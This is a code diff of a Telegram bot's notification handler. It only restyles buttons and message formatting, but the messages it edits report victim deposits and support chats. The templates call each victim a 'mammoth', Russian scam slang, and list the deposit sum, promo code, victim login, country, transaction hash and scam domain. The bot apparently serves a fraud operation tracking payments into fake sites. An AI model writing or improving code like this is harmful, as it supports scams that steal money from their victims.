@@ -107,7 +107,7 @@ async def inline_handler(call: types.CallbackQuery, state: FSMContext):
             
             buttons = types.InlineKeyboardMarkup(inline_keyboard=[
                 [
-                    types.InlineKeyboardButton(text=f"{'🔴 Выключить' if data[1] == 1 else '🟢 Включить'}", callback_data=f"{'disabler_deposit' if data[1] == 1 else 'enabler_deposit'}")
+                    types.InlineKeyboardButton(text=f"{'🔕 Выключить' if data[1] == 1 else '🔔 Включить'}", callback_data=f"{'disabler_deposit' if data[1] == 1 else 'enabler_deposit'}")
                 ],
                 [
                     types.InlineKeyboardButton(text="❄️", callback_data="notif_setts")
@@ -120,12 +120,12 @@ async def inline_handler(call: types.CallbackQuery, state: FSMContext):
 
 🔥 Хо-хо-хо! Вам пришел депозит!</b>
 
-<blockquote>├❄️Сумма: {sum}
-├🎟Промокод: {promo}
-├🦣Логин мамонта: {mail}
-├🌍Страна: {country}
-├⛓️Хэш транзакции: {hash transaction}
-└🔐Домен: {domain}</blockquote>
+<blockquote><b>├❄️Сумма: <code>{sum}</code>
+├🎟Промокод: <code>{promo}</code>
+├🦣Логин мамонта: <code>{mail}</code>
+├🌍Страна: <code>{country}</code>
+├⛓️Хэш транзакции: <code>{hash transaction}</code>
+└🔐Домен: <code>{domain}</code></b></blockquote>
 '''
             await call.message.edit_text(
                 text=text,
@@ -139,7 +139,7 @@ async def inline_handler(call: types.CallbackQuery, state: FSMContext):
             
             buttons = types.InlineKeyboardMarkup(inline_keyboard=[
                 [
-                    types.InlineKeyboardButton(text=f"{'🔴 Выключить' if data[2] == 1 else '🟢 Включить'}", callback_data=f"{'disabler_support' if data[2] == 1 else 'enabler_support'}")
+                    types.InlineKeyboardButton(text=f"{'🔕 Выключить' if data[2] == 1 else '🔔 Включить'}", callback_data=f"{'disabler_support' if data[2] == 1 else 'enabler_support'}")
                 ],
                 [
                     types.InlineKeyboardButton(text="❄️", callback_data="notif_setts")
@@ -152,10 +152,10 @@ async def inline_handler(call: types.CallbackQuery, state: FSMContext):
 
 💬 Пришло новое сообщение в Live Support!</b>
 
-<blockquote>├🦣Логин мамонта: {mail}
-├🌍Страна: {country}
-├🎟Промокод: {promo}
-└🔐Домен: {domain}</blockquote>
+<blockquote><b>├🦣Логин мамонта: <code>{mail}</code>
+├🌍Страна: <code>{country}</code>
+├🎟Промокод: <code>{promo}</code>
+└🔐Домен: <code>{domain}</code></b></blockquote>
 '''
             await call.message.edit_text(
                 text=text,
@@ -176,7 +176,7 @@ async def inline_handler(call: types.CallbackQuery, state: FSMContext):
 
                 buttons = types.InlineKeyboardMarkup(inline_keyboard=[
                     [
-                        types.InlineKeyboardButton(text=f"{'🔴 Выключить' if data[1] == 1 else '🟢 Включить'}", callback_data=f"{'disabler_deposit' if data[1] == 1 else 'enabler_deposit'}")
+                        types.InlineKeyboardButton(text=f"{'🔕 Выключить' if data[1] == 1 else '🔔 Включить'}", callback_data=f"{'disabler_deposit' if data[1] == 1 else 'enabler_deposit'}")
                     ],
                     [
                         types.InlineKeyboardButton(text="❄️", callback_data="notif_setts")
@@ -189,12 +189,12 @@ async def inline_handler(call: types.CallbackQuery, state: FSMContext):
 
 🔥 Хо-хо-хо! Вам пришел депозит!</b>
 
-<blockquote>├❄️Сумма: {sum}
-├🎟Промокод: {promo}
-├🦣Логин мамонта: {mail}
-├🌍Страна: {country}
-├⛓️Хэш транзакции: {hash transaction}
-└🔐Домен: {domain}</blockquote>
+<blockquote><b>├❄️Сумма: <code>{sum}</code>
+├🎟Промокод: <code>{promo}</code>
+├🦣Логин мамонта: <code>{mail}</code>
+├🌍Страна: <code>{country}</code>
+├⛓️Хэш транзакции: <code>{hash transaction}</code>
+└🔐Домен: <code>{domain}</code></b></blockquote>
 '''
                 await call.message.edit_text(
                     text=text,
@@ -212,7 +212,7 @@ async def inline_handler(call: types.CallbackQuery, state: FSMContext):
             
                 buttons = types.InlineKeyboardMarkup(inline_keyboard=[
                     [
-                        types.InlineKeyboardButton(text=f"{'🔴 Выключить' if data[2] == 1 else '🟢 Включить'}", callback_data=f"{'disabler_support' if data[2] == 1 else 'enabler_support'}")
+                        types.InlineKeyboardButton(text=f"{'🔕 Выключить' if data[2] == 1 else '🔔 Включить'}", callback_data=f"{'disabler_support' if data[2] == 1 else 'enabler_support'}")
                     ],
                     [
                         types.InlineKeyboardButton(text="❄️", callback_data="notif_setts")
@@ -225,10 +225,10 @@ async def inline_handler(call: types.CallbackQuery, state: FSMContext):
 
 💬 Пришло новое сообщение в Live Support!</b>
 
-<blockquote>├🦣Логин мамонта: {mail}
-├🌍Страна: {country}
-├🎟Промокод: {promo}
-└🔐Домен: {domain}</blockquote>
+<blockquote><b>├🦣Логин мамонта: <code>{mail}</code>
+├🌍Страна: <code>{country}</code>
+├🎟Промокод: <code>{promo}</code>
+└🔐Домен: <code>{domain}</code></b></blockquote>
 '''
                 await call.message.edit_text(
                     text=text,
@@ -249,7 +249,7 @@ async def inline_handler(call: types.CallbackQuery, state: FSMContext):
 
                 buttons = types.InlineKeyboardMarkup(inline_keyboard=[
                     [
-                        types.InlineKeyboardButton(text=f"{'🔴 Выключить' if data[1] == 1 else '🟢 Включить'}", callback_data=f"{'disabler_deposit' if data[1] == 1 else 'enabler_deposit'}")
+                        types.InlineKeyboardButton(text=f"{'🔕 Выключить' if data[1] == 1 else '🔔 Включить'}", callback_data=f"{'disabler_deposit' if data[1] == 1 else 'enabler_deposit'}")
                     ],
                     [
                         types.InlineKeyboardButton(text="❄️", callback_data="notif_setts")
@@ -262,12 +262,12 @@ async def inline_handler(call: types.CallbackQuery, state: FSMContext):
 
 🔥 Хо-хо-хо! Вам пришел депозит!</b>
 
-<blockquote>├❄️Сумма: {sum}
-├🎟Промокод: {promo}
-├🦣Логин мамонта: {mail}
-├🌍Страна: {country}
-├⛓️Хэш транзакции: {hash transaction}
-└🔐Домен: {domain}</blockquote>
+<blockquote><b>├❄️Сумма: <code>{sum}</code>
+├🎟Промокод: <code>{promo}</code>
+├🦣Логин мамонта: <code>{mail}</code>
+├🌍Страна: <code>{country}</code>
+├⛓️Хэш транзакции: <code>{hash transaction}</code>
+└🔐Домен: <code>{domain}</code></b></blockquote>
 '''
                 await call.message.edit_text(
                     text=text,
@@ -285,7 +285,7 @@ async def inline_handler(call: types.CallbackQuery, state: FSMContext):
             
                 buttons = types.InlineKeyboardMarkup(inline_keyboard=[
                     [
-                        types.InlineKeyboardButton(text=f"{'🔴 Выключить' if data[2] == 1 else '🟢 Включить'}", callback_data=f"{'disabler_support' if data[2] == 1 else 'enabler_support'}")
+                        types.InlineKeyboardButton(text=f"{'🔕 Выключить' if data[2] == 1 else '🔔 Включить'}", callback_data=f"{'disabler_support' if data[2] == 1 else 'enabler_support'}")
                     ],
                     [
                         types.InlineKeyboardButton(text="❄️", callback_data="notif_setts")
@@ -298,10 +298,10 @@ async def inline_handler(call: types.CallbackQuery, state: FSMContext):
 
 💬 Пришло новое сообщение в Live Support!</b>
 
-<blockquote>├🦣Логин мамонта: {mail}
-├🌍Страна: {country}
-├🎟Промокод: {promo}
-└🔐Домен: {domain}</blockquote>
+<blockquote><b>├🦣Логин мамонта: <code>{mail}</code>
+├🌍Страна: <code>{country}</code>
+├🎟Промокод: <code>{promo}</code>
+└🔐Домен: <code>{domain}</code></b></blockquote>
 '''
                 await call.message.edit_text(
                     text=text,
